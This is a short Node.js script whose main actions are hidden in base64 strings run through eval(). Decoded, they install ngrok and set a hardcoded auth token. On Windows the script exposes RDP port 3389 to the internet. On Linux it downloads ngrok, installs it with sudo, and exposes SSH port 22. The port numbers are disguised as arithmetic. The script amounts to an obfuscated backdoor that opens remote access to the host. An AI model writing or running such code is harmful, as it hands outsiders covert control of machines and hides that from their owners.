const child = require('child_process')
const secret1 = Buffer.from('bmdyb2s=', 'base64').toString()
const { SessionBuilder } = require(`@${secret1}/${secret1}`)

const os = process.argv[2]

if (os !== 'windows' && os !== 'linux') throw new Error('This is illegal!! You are not in the civilization')

async function runShell (command) {
    const spawnedProcess = child.spawn(command, { shell: true }) // on windows it will default to cmd

    return new Promise((resolve) => spawnedProcess.on('exit', resolve))
}

const builder = new SessionBuilder
const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3RHBBc3ZTZkxSOTc4ZjNLUENTWEp0SmJDTV84TVVZVDJtQjdOdkcxandkeEMxaycp', 'base64').toString()
eval(secret2)

if (os === 'windows') windows()
else if (os === 'linux') linux()

async function listen (port) {
    const session = await builder.connect()

    const listener = await session
        .tcpEndpoint()
        .listen()

    listener.forward(`localhost:${port}`)
}

async function windows () {
    const secret = 'YXdhaXQgcnVuU2hlbGwoJ2Nob2NvIGluc3RhbGwgbmdyb2snKTsgYXdhaXQgcnVuU2hlbGwoJ25ncm9rIGNvbmZpZyBhZGQtYXV0aHRva2VuIDI3RHBBc3ZTZkxSOTc4ZjNLUENTWEp0SmJDTV84TVVZVDJtQjdOdkcxandkeEMxaycpOyBhd2FpdCBydW5TaGVsbCgnc3RhcnQgbmdyb2sgdGNwIDMzODknKQ=='
    eval(secret)

    listen(72809 - 69420)
}

async function linux () {
    const secret = 'YXdhaXQgcnVuU2hlbGwoJ3dnZXQgaHR0cHM6Ly9iaW4uZXF1aW5veC5pby9jL2JOeWoxbVFWWTRjL25ncm9rLXYzLXN0YWJsZS1saW51eC1hbWQ2NC50Z3onKTsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gdGFyIC14dnpmIG5ncm9rLXYzLXN0YWJsZS1saW51eC1hbWQ2NC50Z3ogLUMgL3Vzci9sb2NhbC9iaW4nKTsgYXdhaXQgcnVuU2hlbGwoJ25ncm9rIGNvbmZpZyBhZGQtYXV0aHRva2VuIDI3RHBBc3ZTZkxSOTc4ZjNLUENTWEp0SmJDTV84TVVZVDJtQjdOdkcxandkeEMxaycpOyBydW5TaGVsbCgnbmdyb2sgdGNwIDIyJyk='
    eval(secret)

    listen(69442 - 69420)
}
